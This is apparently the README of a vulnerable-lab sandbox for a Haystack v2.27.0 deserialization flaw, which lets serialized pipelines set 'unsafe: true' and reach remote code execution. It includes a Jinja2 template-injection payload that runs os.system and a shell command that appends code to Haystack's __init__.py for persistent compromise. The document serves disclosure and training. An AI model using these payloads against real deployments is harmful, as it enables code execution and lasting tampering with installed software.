# Vulnerable Haystack Sandbox (haystack-ai v2.27.0)

A containerized sandbox environment demonstrating a **critical Insecure Orchestration vulnerability** in Deepset Haystack. This sandbox exposes a serialization boundary evasion flaw where the `from_dict()` deserialization method passes security-critical parameters directly to component constructors without validation, allowing attackers to bypass the `unsafe=False` boundary and achieve persistent Remote Code Execution (RCE).

| Field | Value |
|-------|-------|
| **Target** | Deepset Haystack (`haystack-ai` v2.27.0) |
| **CVSS v3.1** | **10.0 (Critical)** – AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **CWE Chain** | CWE-502 (Deserialization of Untrusted Data) → CWE-94 (Code Injection) → CWE-184 (Incomplete Input Filtering) |
| **Root Cause** | `default_from_dict()` passes all `init_parameters` directly to component constructors without stripping security-critical flags |
| **Research Paper** | [JDP-2026-005](https://jdp-security.github.io/security-research-papers/2026-05-13-deepset-haystack-disclosure.html) |
| **Author** | Jeff Ponte (JDP Security) |

---

## Vulnerability Overview

### The Serialization Boundary Flaw

The `unsafe` flag is documented as a security control that gates Jinja2 template execution. When `unsafe=False`, the framework uses `SandboxedEnvironment`. When `unsafe=True`, it uses `NativeEnvironment` which allows arbitrary code execution. However, the deserialization method `from_dict()` trusts the serialized data implicitly:

```python
# haystack/core/serialization.py
def default_from_dict(cls: type[T], data: dict[str, Any]) -> T:
    init_params = data.get("init_parameters", {})
    # ... type validation only (no security validation) ...
    return cls(**init_params)  # PASSES ALL PARAMETERS TO CONSTRUCTOR UNFILTERED
```

An attacker simply includes `"unsafe": true` in the serialized pipeline payload, and the framework initializes the component in unsafe mode — bypassing the Jinja2 sandbox entirely.

### Affected Components

Both `OutputAdapter` and `ConditionalRouter` components accept the `unsafe` parameter and are vulnerable through the same deserialization path.

---

## Quick Start

### Prerequisites

- Docker or Podman
- Python 3.10+
- Make

### Build and Run

```bash
cd sandboxes/agentic_local_haystack

# Build the container
make attack

# Verify the service is running
curl http://localhost:8000/health
```

### Expected Health Response

```json
{
  "status": "ok",
  "haystack_version": "2.27.0"
}
```

---

## API Endpoints

### `GET /health`

Returns sandbox status and Haystack version.

### `POST /chat`

Main interaction endpoint. Accepts a JSON body with a `query` field containing a pipeline definition to load and execute.

**YAML Pipeline Load:**
```json
{
  "query": "Action: load_pipeline\nAction Input: {\"pipeline\": \"components:\\n  adapter:\\n    type: haystack.components.converters.output_adapter.OutputAdapter\\n    init_parameters:\\n      template: |\\n        {{ trigger }}{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}\\n      output_type: str\\n      unsafe: true\\nconnections: []\\ninputs: {}\\noutputs: {}\"}"
}
```

### `GET /verify`

Returns the integrity state of the Haystack framework installation. Checks `haystack/__init__.py` for markers indicating persistent compromise.

```json
{
  "status": "clean",
  "haystack_version": "2.27.0",
  "init_file": "/usr/local/lib/python3.11/site-packages/haystack/__init__.py",
  "markers_found": []
}
```

When compromised:
```json
{
  "status": "compromised",
  "haystack_version": "2.27.0",
  "init_file": "/usr/local/lib/python3.11/site-packages/haystack/__init__.py",
  "markers_found": ["SCOPE CHANGE", "HAYSTACK SCOPE CHANGE"]
}
```

---

## Exploitation Lifecycle

### Stage 1: YAML Deserialization Bypass

A malicious YAML pipeline with `"unsafe": true` is processed by `Pipeline.from_dict()`. The `default_from_dict()` sink passes the `unsafe` parameter directly to the component constructor without validation.

```yaml
components:
  adapter:
    type: haystack.components.converters.output_adapter.OutputAdapter
    init_parameters:
      template: |
        {{ trigger }}{{ self.__init__.__globals__.__builtins__.__import__('os').system('id') }}
      output_type: str
      unsafe: true
```

### Stage 2: Persistent Framework Compromise (Scope Change)

The initial RCE is weaponized to append Python code to the global framework file:

```bash
echo 'print("!!! HAYSTACK SCOPE CHANGE: 10.0 CRITICAL !!!")' >> /usr/local/lib/python3.11/site-packages/haystack/__init__.py
```

This creates a **CVSS Scope Change (S:C)** — every subsequent Python process executing `import haystack` will run the injected payload. The compromise survives pipeline deletion, application restarts, and container reboots.

---

## Exploitation

The companion exploitation tools are located in:

```
exploitation/
└── haystack/
    ├── interactive_trainer.py      # Menu-driven CLI trainer (6 lessons)
    └── payloads/                   # Pre-built exploit payloads
        ├── yaml_bypass.yaml
        ├── rce_persist.yaml
        └── conditional_router_bypass.yaml
```

---

## Container Management

```bash
# Stop the container
make stop

# View logs
make logs

# Clean up everything
make clean
```

---

## Files

| File | Purpose |
|------|---------|
| `Containerfile` | Python 3.11-slim build with haystack-ai v2.27.0 |
| `Makefile` | Build/run/stop lifecycle management |
| `README.md` | This documentation |
| `app/server.py` | Vulnerable Flask API server with /chat, /verify, and /health endpoints |

---

## References

- [JDP-2026-005: Architectural Boundary Limitations in Haystack](https://jdp-security.github.io/security-research-papers/2026-05-13-deepset-haystack-disclosure.html)
- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)
- [CWE-184: Incomplete List of Disallowed Inputs](https://cwe.mitre.org/data/definitions/184.html)
- OWASP Top 10 for LLM Applications: [LLM06 – Excessive Agency](https://owasp.org/www-project-top-10-for-llm-applications/)
- OWASP Agentic Security: [ASI02 – Tool Misuse](https://owasp.org/www-project-agentic-security/)
- [Commit 3e3f79b9: Introduction of the `unsafe` feature](https://github.com/deepset-ai/haystack/commit/3e3f79b9285c5b56432aac3e4ef2309e5f31ea74)

